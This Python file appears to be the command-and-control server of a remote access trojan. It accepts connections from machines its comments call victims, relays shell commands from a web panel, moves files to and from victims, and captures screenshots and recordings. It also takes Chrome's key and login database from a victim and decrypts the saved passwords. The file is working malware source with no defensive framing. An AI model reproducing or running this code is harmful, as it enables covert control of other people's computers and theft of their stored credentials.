import socket
import threading
from _thread import *
import json
import os
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
from datetime import datetime, timedelta


class Server:
    port = None
    ip = None
    listen_count = None
    client_name = ''
    sockets_ip = {}

    def __init__(self, port, ip, listen_count, client_name):
        self.port = port
        self.ip = ip
        self.listen_count = listen_count
        self.client_name = client_name
        self.s = socket.socket()
        self.s.bind(('0.0.0.0', self.port))
        self.s.listen(self.listen_count)

    def start_server_listen(self):
        pass
        # self.server_socket, self.adress = self.s.accept()

    def connect_to_web(self):
        self.sock = socket.socket()
        self.sock.bind((self.ip, 6666))
        self.sock.listen(self.listen_count)
        self.sock.listen(1)
        self.web_server_socket, self.web_adress = self.sock.accept()
        print('connected to node.js')

    def runThread(self):
        self.connect_to_web()
        # self.start_server_listen()
        # print('connected to victim')
        self.get_command_from_server()

    def get_chrome_datetime(self, chromedate):
        """Return a `datetime.datetime` object from a chrome format datetime
        Since `chromedate` is formatted as the number of microseconds since January, 1601"""
        return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)

    def get_encryption_key(self):
        with open(os.path.join(os.environ["USERPROFILE"],
                               "AppData", "Local", "Google", "Chrome",
                               "User Data", "Local State"), "r", encoding="utf-8") as file:
            local_state = file.read()
            local_state = json.loads(local_state)
        # decode the encryption key from Base64
        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        # remove DPAPI str
        key = key[5:]
        # return decrypted key that was originally encrypted
        # using a session key derived from current user's logon credentials
        # doc: http://timgolden.me.uk/pywin32-docs/win32crypt.html
        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

    def decrypt_password(self, password, key):
        try:
            # get the initialization vector
            iv = password[3:15]
            password = password[15:]
            # generate cipher
            cipher = AES.new(key, AES.MODE_GCM, iv)
            # decrypt password
            return cipher.decrypt(password)[:-16].decode()
        except:
            try:
                return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
            except:
                # not supported
                return ""

    def decode_chrome_passwords(self):
        # get the AES key
        key = self.get_encryption_key()
        content = ""
        # connect to the database
        db = sqlite3.connect("ChromeData")
        cursor = db.cursor()
        # `logins` table has the data we need
        cursor.execute(
            "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
        # iterate over all rows
        for row in cursor.fetchall():
            origin_url = row[0]
            action_url = row[1]
            username = row[2]
            password = self.decrypt_password(row[3], key)
            date_created = row[4]
            date_last_used = row[5]
            if username or password:
                print(f"Origin URL: {origin_url}")
                print(f"Action URL: {action_url}")
                print(f"Username: {username}")
                print(f"Password: {password}")
                content += f"Origin URL: {origin_url} + \n + Action URL: {action_url} + \n + Username: {username} + \n + Password: {password} + \n"
            else:
                continue
            if date_created != 86400000000 and date_created:
                print(f"Creation date: {str(self.get_chrome_datetime(date_created))}")
                content += f"Creation date: {str(self.get_chrome_datetime(date_created))} + \n"
            if date_last_used != 86400000000 and date_last_used:
                print(f"Last Used: {str(self.get_chrome_datetime(date_last_used))}")
                content += f"Last Used: {str(self.get_chrome_datetime(date_last_used))} + \n"
            print("=" * 50)
            content += "=" * 50 + "\n"
        cursor.close()
        db.close()
        return content

    def receive_file_from_client(self, path_to_save, sock):

        # Take from the victim file
        if path_to_save == "":
            self.web_server_socket.send("Where do you want save the file?".encode())
            path_to_save = file_path = self.web_server_socket.recv(1024).decode()

        with open(path_to_save, 'wb')as f:
            print('Open File')
            self.web_server_socket.send("Open File".encode())
            while True:
                data = sock.recv(1024)
                if not data or len(data) < 1024:
                    if data:
                        f.write(data)
                    f.flush()
                    f.close()
                    break
                f.write(data)
        print('done')
        self.web_server_socket.send('Done!'.encode())

    def send_file_to_client(self, data, sock):
        # Send to the victim files
        self.web_server_socket.send("Whete do you want to save the file".encode())
        victim_path = self.web_server_socket.recv(1024).decode()  # input('Where do you want save the file\n')
        sock.send(victim_path.encode('utf-8'))
        f = open(data, 'rb')
        while True:
            content = f.read(1024)
            if content:
                sock.send(content)
            else:
                f.close()
                break
        self.web_server_socket.send("The file was sent to the victim successfully!".encode())

    def get_command_from_server(self):
        start_new_thread(self.wait_for_connections, ())
        while True:
            try:
                command = json.loads(self.web_server_socket.recv(1024).decode())
                print(command)
                if command[1] == '':
                    continue

                self.run_command(command[0], self.sockets_ip[command[1]])

            except socket.error as e:
                del self.web_server_socket
                print("There is an error")
                print(e)
                self.connect_to_web()
                continue

    def wait_for_connections(self):
        while True:
            sock, addr = self.s.accept()
            print("New  connection")
            print(addr[0])
            self.sockets_ip[addr[0]] = sock
            self.web_server_socket.send(('Connected$ ' + addr[0]).encode())

    def run_command(self, command, sock):
        print("test")
        print(command)
        data = None
        sock.send(command.encode('utf-8'))

        # recv file (file name on victim computer)
        if command.startswith('recv file'):
            self.receive_file_from_client("", sock)

        # for sending mcd commands to victim computer
        elif command.startswith("cmd"):
            data = sock.recv(2048)
            print(data.decode('utf-8', 'ignore'))
            self.web_server_socket.send(data)



        elif command.startswith("get files"):
            data = sock.recv(20)
            try:
                data = sock.recv(int(data.decode()))
                print(data.decode())
            except:
                print(data)


        elif command.startswith('download file '):
            command = command[14:-1] + command[-1]
            self.send_file_to_client(command, sock)


        elif command.startswith('take record '):
            command = command[12:-1] + command[-1]
            sock.send(command.encode('utf-8'))
            path = input("Where do you want save the file on victim computer\n")
            sock.send(path.encode('utf-8'))
            self.receive_file_from_client("", sock)

        elif command.startswith("get chrome passwords"):
            self.receive_file_from_client("ChromeKey", sock)
            self.receive_file_from_client("ChromeData", sock)
            self.web_server_socket.send(self.decode_chrome_passwords().encode())

        elif command.startswith('take screenshot '):
            self.receive_file_from_client("", sock)

        elif command == 'exit':
            return

        elif command.startswith('listen'):
            self.receive_file_from_client("", sock)

        elif command == 'exit':
            sock.close()
            pass

        elif command == 'q':
            print("quitting")
            sock.close()
            self.web_server_socket.close()
            self.web_server_socket.send("Quitting!".encode())
            quit(1)

        else:
            data = sock.recv(1024).decode('utf-8')
            print(data)
            self.web_server_socket.send(data.encode())
            return

    # self.server_socket.close()


myServer = Server(9098, '127.0.0.1', 1, 'client1')
while True:
    try:
        myServer.runThread()
    except Exception as e:
        print(e)

# myServer2 = Server(9999, '127.0.0.1', 1, 'client2')
#
# t1 = threading.Thread(target=myServer.runThread, args=())
# t2 = threading.Thread(target=myServer2.runThread, args=())
#
# t1.start()
# t2.start()
#
# t1.join()
# t2.join()
